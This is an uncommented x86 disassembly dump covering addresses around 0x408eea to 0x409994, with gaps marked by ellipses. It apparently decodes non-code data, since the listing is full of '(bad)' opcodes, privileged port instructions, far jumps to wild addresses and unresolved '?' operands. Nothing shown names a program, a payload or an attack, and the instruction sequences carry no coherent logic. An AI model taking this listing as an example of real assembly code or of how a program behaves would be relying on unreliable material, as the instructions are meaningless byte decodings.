  408eea:	call   0x97f898
  408eef:	or     edx,DWORD PTR [edi]
  408ef1:	sub    al,BYTE PTR [ecx+ebp*8]
  408ef4:	mov    edx,DWORD PTR [edi+0x0]
  408ef7:	add    BYTE PTR [edi-0x18beb829],ch
  408efd:	sahf   
  408efe:	jne    0x408f0c
  408f00:	aas    
  408f01:	in     eax,0xcd
  408f03:	push   DWORD PTR [eax]
  408f05:	rcl    BYTE PTR [edx+eax*8-0x72005fbf],cl
  408f0c:	aad    0x71
  408f0e:	push   edx
  408f0f:	push   eax
  408f10:	aas    
  408f11:	mov    eax,ds:0xd90ffce
  408f16:	(bad)  
  408f17:	jne    0x408eb0
  408f19:	or     eax,0xb58f75fe
  408f1e:	adc    bh,bh
  408f20:	jo     0x408ec0
  408f22:	call   0x409020
	...
  408f4b:	add    BYTE PTR [eax],al
  408f4d:	add    ch,bl
  408f4f:	sahf   
  408f50:	(bad)  
  408f51:	jmp    0x408f57
  408f53:	rol    BYTE PTR [ecx+0x2c],cl
  408f56:	out    dx,al
  408f57:	fdiv   DWORD PTR [ebx+0x689eb0fe]
  408f5d:	fadd   DWORD PTR [esi+0x1e]
  408f60:	(bad)  
  408f61:	(bad)  
  408f62:	cli    
  408f63:	jmp    0xb5f18f65
  408f68:	push   edx
  408f69:	mov    bh,0x3e
  408f6b:	xor    al,0x3
  408f6d:	or     edi,DWORD PTR [esi+0x47]
  408f70:	(bad)  
  408f71:	shr    BYTE PTR [bp+si-0x3d],0xff
  408f76:	xor    BYTE PTR [eax],ch
  408f78:	psubsb mm3,QWORD PTR [edx+0x21ff7bf8]
  408f7f:	push   0xba19feb7
  408f84:	shl    edi,cl
  408f86:	retf   0x7c70
  408f89:	jmp    FWORD PTR [esi-0x1e]
  408f8c:	jg     0x40900b
  408f8e:	cs xor dh,bh
  408f91:	or     al,0x66
  408f93:	mov    eax,ds:0xc23e40d2
  408f98:	push   0x22
  408f9a:	mov    cl,0x32
  408f9c:	add    ebp,ebx
  408f9e:	cmp    ebp,DWORD PTR [edx+0x323e0002]
  408fa4:	(bad)  [edx]
  408fa6:	inc    dh
  408fa8:	or     DWORD PTR [edx-0x37],edx
  408fab:	mov    edi,0x50a8e80a
  408fb0:	jl     0x408fb1
	...
  408fda:	add    BYTE PTR [eax],al
  408fdc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408fdd:	jle    0x409028
  408fdf:	push   DWORD PTR [ecx-0x573d7951]
  408fe5:	sub    DWORD PTR [ebx+0x50],edi
  408fe8:	mov    eax,ds:0x99febf67
  408fed:	cmp    DWORD PTR [eax+eax*1-0x38],ebp
  408ff1:	xor    al,BYTE PTR [ebx]
  408ff3:	test   DWORD PTR [esi+0x39],edi
  408ff6:	adc    BYTE PTR [eax],0x81
  408ff9:	adc    DWORD PTR [ebx-0x1],edi
  408ffc:	mov    bl,0xd6
  408ffe:	jns    0x408fff
  409000:	jno    0x40900c
  409002:	ja     0x408fb9
  409004:	xor    bh,BYTE PTR ds:[edx-0x4b]
  409008:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409009:	lock jp 0x40900b
  40900c:	pop    bx
  40900e:	or     eax,0xb020514e
  409013:	inc    esi
  409014:	cmp    bl,BYTE PTR [ebx+0x3c]
  409017:	(bad)  
  409018:	push   edx
  409019:	fsub   QWORD PTR [eax+edi*2+0x4859601]
  409020:	ds pop ebx
  409022:	jmp    0x819043a1
  409027:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409028:	lock pop ds
  40902a:	outs   dx,BYTE PTR ds:[esi]
  40902b:	paddd  mm4,QWORD PTR [esi+0x1f7b8d03]
  409032:	pop    esi
  409033:	icebp  
  409034:	cmp    DWORD PTR [eax],esp
  409036:	fdiv   QWORD PTR [edi+0x16]
  409039:	add    ebx,DWORD PTR [ebx+edi*2]
  40903c:	stc    
  40903d:	mov    al,BYTE PTR [esi-0xf]
	...
  409068:	add    BYTE PTR [eax],al
  40906a:	cmc    
  40906b:	xor    bh,cl
  40906d:	dec    ebp
  40906e:	jmp    0xe601f692
  409073:	mov    ah,0xe8
  409075:	jp     0x4090ca
  409077:	pop    ds
  409078:	es icebp 
  40907a:	cmp    DWORD PTR [ebx],esi
  40907c:	aad    0x79
  40907e:	leave  
  40907f:	pop    ds
  409080:	push   ss
  409081:	icebp  
  409082:	lds    esi,FWORD PTR [edx]
  409084:	icebp  
  409085:	dec    ebp
  409086:	mov    ecx,0x4246301f
  40908b:	pop    ebx
  40908c:	xchg   esp,eax
  40908d:	mov    ds,WORD PTR [edx-0x5f8bd327]
  409093:	pop    ds
  409094:	out    dx,al
  409095:	in     eax,dx
  409096:	cdq    
  409097:	mov    cl,0xea
  409099:	jp     0x4090a6
  40909b:	push   ebx
  40909c:	shl    DWORD PTR [edx],1
  40909e:	sbb    DWORD PTR [edi],0x1efb8cd6
  4090a4:	inc    ecx
  4090a5:	add    BYTE PTR [edi],bh
  4090a7:	pop    ebx
  4090a8:	jmp    0xbf684c35
  4090ad:	jp     0x409118
  4090af:	mov    al,BYTE PTR [eax]
  4090b1:	shl    DWORD PTR [esi+0x48e8ffe5],0x1b
  4090b8:	(bad)  
  4090ba:	cwde   
  4090bb:	pop    edx
  4090bc:	add    cl,ch
  4090be:	push   es
  4090bf:	push   edi
  4090c0:	add    ecx,ebp
  4090c2:	cmp    eax,0x3d718750
  4090c7:	pop    ebx
  4090c8:	add    BYTE PTR [ecx],dl
  4090ca:	test   DWORD PTR [ecx+eax*2+0xe9],ecx
	...
  4090f5:	add    BYTE PTR [eax],al
  4090f7:	add    BYTE PTR [esi-0x5b880928],dh
  4090fd:	push   ds
  4090fe:	push   eax
  4090ff:	sbb    DWORD PTR [edi],0xc266ff10
  409105:	fsubr  st,st(7)
  409107:	pop    edi
  409108:	test   BYTE PTR [esi],bl
  40910a:	call   FWORD PTR [ebp+ecx*4-0x1ab100e3]
  409111:	pop    edx
  409112:	add    ecx,ebp
  409114:	cmp    eax,0x673684d0
  409119:	push   ds
  40911a:	call   FWORD PTR [ecx-0x57b8292b]
  409120:	cmp    eax,0xfab8e4b3
  409125:	push   ds
  409126:	addr16 cmp al,0xf2
  409129:	fwait
  40912a:	add    BYTE PTR [ecx],al
  40912c:	clc    
  40912d:	out    0xff,eax
  40912f:	call   0xd8b4ac7c
  409134:	mov    ds:0x2c648c1e,eax
  409139:	sbb    eax,0x1d8cf6ff
  40913e:	jne    0x409121
  409140:	and    eax,0x17e6fcc1
  409145:	push   ds
  409146:	mov    ch,0xd9
  409148:	add    al,0x1e
  40914a:	inc    DWORD PTR [ecx+0x3e]
  40914d:	pop    esp
  40914e:	add    cl,ch
  409150:	rcr    al,0xf6
  409153:	add    BYTE PTR [ecx-0x5c],bh
  409156:	call   DWORD PTR [eax+0xf]
  409159:	iret   
  40915a:	inc    edi
  40915b:	inc    ecx
	...
  409184:	add    BYTE PTR [eax],al
  409186:	push   edi
  409187:	xor    ah,bh
  409189:	push   ecx
  40918a:	es push edi
  40918c:	push   0xff1a16dd
  409191:	out    0x4f,eax
  409193:	in     eax,dx
  409194:	(bad)  
  409195:	call   FWORD PTR [edx+ebx*4+0x74]
  409199:	adc    DWORD PTR ds:0xb0858d57,edi
  40919f:	mov    eax,ds:0xa447ffff
  4091a4:	jne    0x4091ae
  4091a6:	mov    edi,0xa8fffc03
  4091ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4091ac:	mov    ch,0xf0
  4091ae:	cdq    
  4091af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4091b0:	(bad)  
  4091b1:	call   0x40228d
  4091b6:	std    
  4091b7:	outs   dx,BYTE PTR ds:[esi]
  4091b8:	call   0xffe4ec4e
  4091bd:	or     esp,DWORD PTR [edi]
  4091bf:	sub    ebx,DWORD PTR [ebx]
  4091c1:	push   0x400a69
  4091c6:	(bad)  
  4091c7:	mov    cl,0x1d
  4091c9:	int    0x28
  4091cb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4091cc:	push   eax
  4091cd:	push   0xffffffe7
  4091cf:	or     esi,edi
  4091d1:	jne    0x4091a2
  4091d3:	mov    cl,0x32
  4091d5:	std    
  4091d6:	sub    BYTE PTR [eax+ebp*8-0x5ba1e7],ah
  4091dd:	push   0x400a0a
  4091e2:	int    0x3f
  4091e4:	push   DWORD PTR [ebp-0x61]
  4091e7:	mov    cl,0xaa
  4091e9:	inc    BYTE PTR [eax]
	...
  409213:	add    BYTE PTR [eax+0x56ad68a2],ch
  409219:	sbb    bh,bh
  40921b:	imul   esi,DWORD PTR [esp+eiz*4],0x1c3e0875
  409222:	pushf  
  409223:	(bad)  
  409224:	jns    0x409232
  409226:	jmp    0x4091d4
  409228:	(bad)  
  40922a:	add    al,0x6a
  40922c:	dec    edx
  40922d:	fucomp st(5)
  40922f:	pop    es
  409230:	push   esi
  409231:	mov    bh,0x79
  409233:	call   FWORD PTR [ecx-0x14]
  409236:	in     eax,dx
  409237:	sti    
  409238:	push   ecx
  409239:	ds or  al,0xe8
  40923c:	jmp    0x78400a36
  409241:	icebp  
  409242:	(bad)  
  409243:	call   DWORD PTR [edx+0x3e6867b9]
  409249:	xor    ch,BYTE PTR [eax-0x42]
  40924c:	sub    DWORD PTR [eax],ebp
  40924e:	pop    es
  40924f:	jmp    FWORD PTR [ebx+0x28d76b3a]
  409255:	scas   al,BYTE PTR es:[edi]
  409256:	js     0x409221
  409258:	cld    
  409259:	sub    al,BYTE PTR [ebx]
  40925b:	push   ebp
  40925c:	mov    ch,0x8e
  40925e:	test   ah,al
  409260:	push   es
  409261:	outs   dx,BYTE PTR ds:[esi]
  409262:	mov    esi,0x3323efb
  409267:	add    bl,al
  409269:	out    dx,eax
  40926a:	jbe    0x4092bc
  40926c:	push   esi
  40926d:	rol    BYTE PTR gs:[eax+0x3e],cl
  409271:	gs out dx,al
  409273:	or     ebx,ecx
  409275:	daa    
  409276:	lods   eax,DWORD PTR ds:[esi]
  409277:	dec    eax
	...
  4092a0:	add    BYTE PTR [eax],al
  4092a2:	jg     0x4092d6
  4092a4:	imul   edi,DWORD PTR [edx+0xb783df5],0xfffffffe
  4092ab:	mov    esi,0x4a038918
  4092b0:	jmp    0x4092b2
  4092b2:	ds inc ebp
  4092b4:	mov    ecx,0x771e33ff
  4092b9:	jne    0x409261
  4092bb:	and    eax,0xf2a607ed
  4092c0:	push   0xe65b91ff
  4092c5:	icebp  
  4092c6:	xchg   ecx,eax
  4092c7:	xor    ebp,DWORD PTR [ecx+0x4c]
  4092ca:	sbb    DWORD PTR [eax+eiz*4],0x345b4642
  4092d1:	mov    esp,DWORD PTR [edx-0x26]
  4092d4:	lods   al,BYTE PTR ds:[esi]
  4092d5:	mov    al,0x68
  4092d7:	sbb    al,0xbe
  4092d9:	aas    
  4092da:	mov    ebx,0x5977b6e3
  4092df:	pop    ebx
  4092e0:	jmp    0x2c10d0e8
  4092e5:	or     BYTE PTR ds:0xbe01151b,dh
  4092eb:	arpl   cx,bp
  4092ed:	lock inc edx
  4092ef:	xor    ah,ch
  4092f1:	add    al,0x3e
  4092f3:	pop    ebx
  4092f4:	xchg   cl,dh
  4092f6:	cmp    DWORD PTR [esp+esi*8],ebx
  4092f9:	pop    es
  4092fa:	push   ss
  4092fb:	das    
  4092fc:	mov    ds:0x198b1977,al
  409301:	ja     0x40928e
  409303:	push   ebx
  409304:	push   ecx
  409305:	fiadd  WORD PTR [eax]
	...
  40932f:	add    BYTE PTR [eax],cl
  409331:	sbb    al,0x5e
  409333:	ins    BYTE PTR es:[edi],dx
  409334:	inc    eax
  409335:	adc    edx,DWORD PTR [esi+0x77]
  409338:	adc    WORD PTR [esi-0x43e30e3c],bx
  40933f:	pop    es
  409340:	(bad)  
  409341:	or     dh,BYTE PTR [edx]
  409343:	ja     0x409326
  409345:	shr    DWORD PTR [ebx-0x44],1
  409348:	fcomp  DWORD PTR [ebx]
  40934a:	cs in  al,dx
  40934c:	adc    ebx,DWORD PTR [edx-0x17]
  40934f:	add    edi,DWORD PTR [ebx-0x3e89d52b]
  409355:	sbb    edi,DWORD PTR [ecx+0xe13066b]
  40935b:	ja     0x409320
  40935d:	aad    0x2a
  40935f:	jbe    0x40930a
  409361:	sbb    ebx,DWORD PTR [ecx-0x1d148a]
  409367:	not    BYTE PTR [eax]
  409369:	sbb    al,0xe8
  40936b:	jae    0x409339
  40936d:	pop    edx
  40936e:	add    BYTE PTR [eax-0x42],dh
  409371:	fdivp  st(5),st
  409373:	fimul  WORD PTR [eax]
  409375:	fwait
  409376:	(bad)  
  409378:	fcomp  DWORD PTR [edx+0x0]
  40937b:	jmp    0xc8025946
  409380:	lock sbb esi,edi
  409383:	jmp    0x4093d2
  409385:	pop    ebx
  409386:	add    cl,ch
  409388:	imul   esp,DWORD PTR [edi+0x1cff548d],0x98b6a6ff
  409392:	sub    al,0x39
	...
  4093bc:	add    BYTE PTR [eax],al
  4093be:	push   edx
  4093bf:	push   ss
  4093c0:	dec    edi
  4093c1:	sub    BYTE PTR [edx+0x3],al
  4093c4:	push   ecx
  4093c5:	pop    edx
  4093c6:	cmp    eax,0x2ea90b5b
  4093cb:	pop    ebp
  4093cc:	jmp    0x4093f1
  4093ce:	mov    bh,0xf0
  4093d0:	shl    DWORD PTR [edi-0x70],0x1a
  4093d4:	lea    ebp,[ebx]
  4093d6:	stos   WORD PTR es:[edi],ax
  4093d8:	push   0x9c002e
  4093dd:	push   ecx
  4093de:	push   eax
  4093df:	into   
  4093e0:	(bad)  
  4093e1:	call   0xebb5af2a
  4093e6:	fs fwait
  4093e8:	lea    ebx,[edi+edi*2+0x19]
  4093ec:	(bad)  
  4093ed:	ds mov dh,0x9d
  4093f0:	sub    al,0x60
  4093f2:	mov    esi,0x482efdcf
  4093f7:	add    DWORD PTR [esi-0x1e4fd4f],0xffffff94
  4093fe:	cmp    DWORD PTR [ebx],eax
  409400:	cmp    al,0x22
  409402:	xor    BYTE PTR [edx],bl
  409404:	call   DWORD PTR [ecx+eiz*8+0x19]
  409408:	inc    DWORD PTR [eax]
  40940a:	inc    eax
  40940b:	cs out 0x84,eax
  40940e:	ins    BYTE PTR es:[edi],dx
  40940f:	xchg   ecx,eax
  409410:	(bad)  
  409411:	call   FWORD PTR [edx]
  409413:	outs   dx,BYTE PTR ds:[esi]
  409414:	push   eax
  409415:	call   0x403926
  40941a:	inc    edi
  40941b:	das    
  40941c:	(bad)  
  40941d:	jne    0x4093ae
  40941f:	xchg   BYTE PTR [ecx+0xfe],ah
	...
  409449:	add    BYTE PTR [eax],al
  40944b:	add    BYTE PTR [eax-0x67861770],dl
  409451:	nop
  409452:	dec    DWORD PTR [ebp-0x16326]
  409458:	mov    al,ds:0xd3b5fe2f
  40945d:	nop
  40945e:	(bad)  
  40945f:	(bad)  
  409460:	jg     0x40941c
  409462:	mov    dl,0x0
  409464:	push   edi
  409465:	cdq    
  409466:	ror    BYTE PTR [edi],0xda
  409469:	cli    
  40946a:	std    
  40946b:	call   eax
  40946d:	(bad)  
  40946e:	mov    ch,0xbc
  409470:	ror    DWORD PTR [edi-0x33201701],0xff
  409477:	jmp    DWORD PTR [eax-0x6f014836]
  40947d:	nop
  40947e:	call   0xffd06ccc
  409483:	leave  
  409484:	push   ebp
  409485:	arpl   WORD PTR [eax],ax
  409487:	push   ebp
  409488:	mov    WORD PTR [ebx-0x6f6c3b7d],es
  40948e:	jne    0x40949c
  409490:	jg     0x409472
  409492:	retf   0x80ff
  409495:	out    0x44,al
  409497:	cld    
  409498:	in     al,dx
  409499:	popf   
  40949a:	je     0x40f403
  4094a0:	inc    DWORD PTR [eax+0x53]
  4094a3:	inc    ecx
  4094a4:	xlat   BYTE PTR ds:[ebx]
  4094a5:	mov    ?,WORD PTR [ebp-0x4]
  4094a8:	das    
  4094a9:	ror    ecx,1
  4094ab:	(bad)  
  4094ac:	ds jno 0x409483
  4094af:	add    BYTE PTR [bx+si],al
	...
  4094da:	xor    ch,dl
  4094dc:	sar    edi,0xf9
  4094df:	pusha  
  4094e0:	out    dx,eax
  4094e1:	pop    es
  4094e2:	xchg   esi,eax
  4094e3:	scas   eax,DWORD PTR es:[edi]
  4094e4:	jbe    0x4094e5
  4094e6:	cdq    
  4094e7:	pop    ebx
  4094e8:	or     edi,eax
  4094ea:	xchg   ecx,eax
  4094eb:	or     bl,ch
  4094ed:	inc    ecx
  4094ee:	in     eax,dx
  4094ef:	inc    edx
  4094f0:	add    al,0xff
  4094f2:	or     edi,DWORD PTR [eax]
  4094f4:	imul   ebx,DWORD PTR [ebp+0x50743084],0xffffffe6
  4094fb:	test   eax,0x743e40d1
  409500:	jne    0x409577
  409502:	ss sub al,0xf0
  409505:	std    
  409506:	pop    ecx
  409507:	shr    BYTE PTR [edx-0x16],1
  40950a:	js     0x4094d4
  40950c:	jae    0x409576
  40950e:	in     eax,0x54
  409510:	ret    
  409511:	inc    DWORD PTR [eax+0x6e]
  409514:	js     0x4094fe
  409516:	mov    edx,0x8eff73bc
  40951b:	pop    edx
  40951c:	not    BYTE PTR [edx+0x7f]
  40951f:	add    dl,bl
  409521:	(bad)  
  409522:	stos   DWORD PTR es:[edi],eax
  409523:	or     ch,BYTE PTR [ebx+0x52]
  409526:	sbb    BYTE PTR [edx-0x3ef8178c],dl
  40952c:	jae    0x40952d
  40952e:	xchg   esi,eax
  40952f:	aaa    
  409530:	rol    BYTE PTR [eax+0x3e],1
  409533:	mov    ecx,0xcde6fbee
  409538:	dec    eax
  409539:	push   ecx
  40953b:	shr    dl,cl
  40953d:	jge    0x40953f
	...
  409567:	add    BYTE PTR [ebp-0x1eaffd3d],cl
  40956d:	iret   
  40956e:	or     ch,al
  409570:	(bad)  
  409572:	je     0x409573
  409574:	out    0xda,al
  409576:	cmp    al,0xff
  409578:	leave  
  409579:	pop    ebx
  40957a:	es out dx,al
  40957c:	lds    eax,FWORD PTR [ebx]
  40957e:	dec    ecx
  40957f:	cmp    eax,0x412018b9
  409584:	inc    esi
  409585:	pop    ebx
  409586:	mov    ah,0x88
  409588:	call   0xe985:0x9772cdc
  40958f:	jmp    0xbbcadd1
  409594:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409595:	sbb    ch,BYTE PTR [edx]
  409597:	je     0x409522
  409599:	loop   0x4095c6
  40959b:	jo     0x409552
  40959d:	push   esi
  40959e:	bsf    edi,esi
  4095a1:	pop    edx
  4095a2:	imul   esi,DWORD PTR [ebx],0xdc128f3e
  4095a8:	pop    eax
  4095a9:	stos   BYTE PTR es:[edi],al
  4095aa:	sub    BYTE PTR [ecx+ecx*1],al
  4095ad:	add    eax,ebp
  4095af:	mov    dh,0x3e
  4095b1:	pop    ebx
  4095b2:	loop   0x4095f7
  4095b4:	retf   0x1678
  4095b7:	pop    esp
  4095b8:	push   es
  4095b9:	sub    esp,DWORD PTR [esi+0x151b3573]
  4095bf:	sbb    BYTE PTR [esi+0x7ed71783],cl
  4095c5:	pop    ebx
  4095c6:	cmp    DWORD PTR [ebx-0x4d],esi
  4095c9:	arpl   WORD PTR [ecx+0x5b],dx
	...
  4095f3:	add    BYTE PTR [eax],al
  4095f5:	add    BYTE PTR [ebx],ah
  4095f7:	sbb    BYTE PTR [esi+0x5c],bh
  4095fa:	mov    BYTE PTR [ecx],ah
  4095fc:	jbe    0x409671
  4095fe:	adc    cl,BYTE PTR [ecx+ebp*4-0x53]
  409602:	or     DWORD PTR [eax],ebx
  409604:	data16 jae 0x409613
  409607:	leave  
  409608:	and    BYTE PTR [ebx],cl
  40960a:	jae    0x40962a
  40960c:	ret    
  40960d:	or     eax,0x5be18df1
  409612:	out    dx,eax
  409613:	sbb    BYTE PTR [esi+0x73],al
  409616:	push   esp
  409617:	cmp    al,0x3e
  409619:	stc    
  40961a:	inc    ecx
  40961b:	add    eax,DWORD PTR [eax]
  40961d:	dec    esi
  40961e:	dec    esp
  40961f:	sbb    bh,bh
  409621:	ret    
  409622:	cmp    DWORD PTR [eax],ebx
  409624:	jne    0x409617
  409626:	gs ss (bad) 
  409629:	push   ds
  40962a:	sub    eax,0xb7162685
  40962f:	pop    edi
  409630:	call   0xff58c26f
  409635:	xchg   ecx,eax
  409636:	cmp    ch,BYTE PTR [ebp-0x71f316bf]
  40963c:	or     BYTE PTR [ecx],al
  40963e:	xchg   DWORD PTR [esi],edx
  409640:	(bad)  
  409641:	out    dx,al
  409642:	gs dec eax
  409644:	push   edx
  409645:	sub    BYTE PTR [edx],bh
  409647:	sbb    BYTE PTR [ebp-0xf],dh
  40964a:	adc    eax,0xecd6fd53
  40964f:	and    BYTE PTR [ebp+0x3b],0x83
  409653:	pop    ss
  409654:	(bad)  
  409655:	cmp    al,0x62
  409657:	jmp    FWORD PTR [edx]
  409659:	mov    esp,0x0
	...
  409682:	add    BYTE PTR [eax],al
  409684:	int3   
  409685:	pop    ss
  409686:	push   0x9a6b5a
  40968b:	scas   al,BYTE PTR es:[edi]
  40968c:	inc    esi
  40968d:	pop    edi
  40968e:	call   0xff58659a
  409693:	adc    DWORD PTR [ebx-0x57],edi
  409696:	inc    ecx
  409697:	jmp    0x81492748
  40969c:	push   edx
  40969d:	sbb    bh,bh
  40969f:	xchg   BYTE PTR ds:0x4228520e,al
  4096a5:	push   ss
  4096a6:	jne    0x409689
  4096a8:	jne    0x409709
  4096aa:	std    
  4096ab:	outs   dx,BYTE PTR ds:[esi]
  4096ac:	mov    WORD PTR [esi],ss
  4096ae:	jne    0x409715
  4096b0:	mov    WORD PTR [eax+0x1a2e5108],ss
  4096b6:	call   DWORD PTR [esi+0xc]
  4096b9:	and    al,0xc2
  4096bb:	in     eax,0x3d
  4096bd:	mov    al,0x8b
  4096bf:	add    BYTE PTR [ebx-0x18f38323],cl
  4096c5:	push   cs
  4096c6:	adc    eax,0xff6a92ff
  4096cb:	jne    0x4096b8
  4096cd:	mov    DWORD PTR [ebp+0x8],esi
  4096d0:	das    
  4096d1:	retf   0xffea
  4096d4:	pop    eax
  4096d5:	mov    DWORD PTR [ebp+0xc],esi
  4096d8:	aas    
  4096d9:	in     eax,0xc4
  4096db:	(bad)  
  4096dc:	cmp    BYTE PTR [edi-0x3e],dl
  4096df:	or     al,0x97
  4096e1:	xor    ecx,DWORD PTR [edx-0x361db14]
  4096e7:	push   0x0
	...
  409711:	add    BYTE PTR [edi-0x67eb8a77],ah
  409717:	push   cs
  409718:	ud0    esp,edx
  40971b:	pop    edx
  40971c:	call   0xffcd46ba
  409721:	or     esp,DWORD PTR [edi+0x22895b13]
  409727:	mov    ebp,DWORD PTR [eax-0x11]
  40972a:	inc    esp
  40972b:	sbb    bh,bh
  40972d:	(bad)  
  40972e:	adc    cl,BYTE PTR [ebx-0x7361f318]
  409734:	jmp    FWORD PTR [eax+0x57]
  409737:	pop    edx
  409738:	out    dx,eax
  409739:	mov    esi,0x8758c07
  40973e:	iret   
  40973f:	mov    ebp,0x36c8fffe
  409744:	stc    
  409745:	push   ebx
  409746:	push   esi
  409747:	pop    edi
  409748:	push   DWORD PTR [ebp-0x45]
  40974b:	mov    dh,0xf1
  40974d:	enter  0x8c98,0x68
  409751:	add    DWORD PTR [edi],esp
  409753:	jnp    0x409713
  409755:	push   eax
  409756:	cwde   
  409757:	push   cs
  409758:	pop    es
  409759:	call   0x4023eb
  40975e:	minps  xmm2,XMMWORD PTR [ecx+eax*2+0x3e]
  409763:	add    al,0x70
  409765:	jne    0x409751
  409767:	fwait
  409768:	pop    edx
  409769:	enter  0x9ce1,0xdc
  40976d:	add    DWORD PTR [esi],edi
  40976f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409770:	mov    dl,0x50
  409772:	rcl    esi,1
  409774:	cli    
  409775:	out    0x0,eax
	...
  40979f:	add    BYTE PTR [ecx+0x45],bl
  4097a2:	jno    0x4097a3
  4097a4:	shl    esi,0x6e
  4097a7:	call   0xffb1d70b
  4097ac:	xchg   DWORD PTR [ecx+0x14],eax
  4097af:	add    BYTE PTR [ebx],dl
  4097b1:	jns    0x409813
  4097b3:	push   0xffc1f84c
  4097b8:	cwde   
  4097b9:	mov    ?,edi
  4097bb:	out    0xe2,eax
  4097bd:	cmp    esi,DWORD PTR [ecx-0x1]
  4097c0:	mov    DWORD PTR [esi+0x34965013],ecx
  4097c6:	cmp    edi,edi
  4097c8:	jns    0x4097fe
  4097ca:	not    BYTE PTR [ebx]
  4097cc:	push   cs
  4097cd:	sub    eax,0x655607f6
  4097d2:	jno    0x4097d3
  4097d4:	popa   
  4097d5:	stos   DWORD PTR es:[edi],eax
  4097d6:	adc    dl,BYTE PTR [edi+edi*8+0x3]
  4097da:	jo     0x409851
  4097dc:	inc    edx
  4097dd:	sbb    al,0x7d
  4097df:	enter  0xc449,0x6f
  4097e3:	jne    0x409813
  4097e5:	push   esp
  4097e6:	pop    esp
  4097e7:	aad    0x6
  4097e9:	imul   BYTE PTR [edi-0x1]
  4097ec:	stos   DWORD PTR es:[edi],eax
  4097ed:	push   ss
  4097ee:	sar    esi,cl
  4097f0:	mov    bl,0xfa
  4097f2:	pop    edx
  4097f3:	sbb    al,0x21
  4097f5:	fisubr WORD PTR [edi-0x37]
  4097f8:	cld    
  4097f9:	xor    al,BYTE PTR [ebx]
  4097fb:	push   ebp
  4097fc:	(bad)
  4097ff:	les    ecx,FWORD PTR [edx]
  409801:	xchg   dh,dh
  409803:	or     eax,DWORD PTR [eax]
	...
  40982d:	add    BYTE PTR [esi],dl
  40982f:	pop    esp
  409830:	add    eax,0xf214f93b
  409835:	inc    ebx
  409836:	push   0xffffffa1
  409838:	pusha  
  409839:	(bad)  
  40983a:	in     eax,0x83
  40983c:	jmp    0xd1166944
  409841:	pusha  
  409842:	ins    DWORD PTR es:[edi],dx
  409843:	call   0xf636:0x174b70e9
  40984a:	inc    ecx
  40984b:	add    esp,DWORD PTR [edx+0x70]
  40984e:	rcl    DWORD PTR [ecx+edx*4],0x2
  409852:	ds add al,0x5f
  409855:	(bad)  [edi-0x56fc5758]
  40985b:	mov    cs,WORD PTR ds:0x11632b70
  409861:	stc    
  409862:	cwde   
  409863:	adc    al,0xfe
  409865:	fidivr DWORD PTR [edi]
  409867:	pop    ebx
  409868:	push   es
  409869:	mov    cl,0x16
  40986b:	pop    esi
  40986c:	xchg   ebp,eax
  40986d:	ret    0x1581
  409870:	pop    esp
  409871:	jo     0x4098ec
  409873:	mov    ?,ecx
  409875:	pop    ebx
  409876:	fist   WORD PTR [ebx]
  409878:	(bad)  
  409879:	outs   dx,DWORD PTR ds:[esi]
  40987a:	imul   ecx,DWORD PTR [esi+0x1ee85ccd],0x19876fc6
  409884:	icebp  
  409885:	add    ebp,ebx
  409887:	ffreep st(4)
  409889:	add    DWORD PTR [edx-0x2bfbbce9],0x5d
  409890:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409891:	stc    
	...
  4098ba:	add    BYTE PTR [eax],al
  4098bc:	inc    ecx
  4098bd:	add    eax,DWORD PTR [ecx+0x60143145]
  4098c3:	leave  
  4098c4:	and    eax,0x7ed3a983
  4098c9:	pop    ebx
  4098ca:	adc    DWORD PTR [esi+0x6ee99a6d],eax
  4098d0:	dec    ebx
  4098d1:	sar    edi,0x20
  4098d4:	add    edx,DWORD PTR [esi+edi*8]
  4098d7:	hlt    
  4098d8:	add    eax,0x6967adfc
  4098dd:	adc    al,0x68
  4098df:	cmp    ecx,DWORD PTR ds:0xb7c1009b
  4098e5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4098e6:	inc    ecx
  4098e7:	jmp    0xb1eae73c
  4098ec:	add    dl,BYTE PTR [esi+edi*8]
  4098ef:	mov    ah,0xd5
  4098f1:	sti    
  4098f2:	xchg   ebp,eax
  4098f3:	aaa    
  4098f4:	pop    ecx
  4098f5:	adc    al,0x68
  4098f7:	push   ss
  4098f8:	in     eax,dx
  4098f9:	call   0xe941:0xa7c39100
  409900:	and    BYTE PTR [esi-0x56],cl
  409903:	mov    eax,ds:0x94fe1382
  409908:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409909:	sti    
  40990a:	jge    0x409913
  40990c:	sub    DWORD PTR [eax+ebp*2],edx
  40990f:	add    eax,0x81009a6d
  409914:	ret    
  409915:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409916:	inc    ecx
  409917:	jmp    0x31eae72c
  40991c:	adc    DWORD PTR [ebx],0xfffffffe
  40991f:	push   esp
	...
  409948:	add    BYTE PTR [eax],al
  40994a:	jb     0x409947
  40994c:	xlat   BYTE PTR gs:[ebx]
  40994e:	fcom   DWORD PTR [ebx]
  409950:	push   0x9a8ca9
  409955:	push   ecx
  409956:	sahf   
  409957:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409958:	inc    ecx
  409959:	jmp    0x21eae73e
  40995e:	adc    DWORD PTR [ebx],0xfffffffe
  409961:	xor    al,0x42
  409963:	sti    
  409964:	dec    ebp
  409965:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409966:	test   al,0x12
  409968:	push   0x9c0cbb
  40996d:	add    esi,ebx
  40996f:	scas   al,BYTE PTR es:[edi]
  409970:	inc    ecx
  409971:	jmp    0xeae206
  409976:	dec    edi
  409977:	sbb    bh,bh
  409979:	dec    BYTE PTR [edx]
  40997b:	pop    ss
  40997c:	out    0x36,eax
  40997e:	xchg   ecx,eax
  40997f:	cmp    edi,0x402da868
  409985:	add    BYTE PTR [edi],cl
  409987:	repz push edx
  409989:	inc    ecx
  40998a:	out    0x81,eax
  40998c:	xor    eax,0xff179faa
  409991:	dec    BYTE PTR [edx]
  409993:	pop    ss
  409994:	out    0x1e,eax
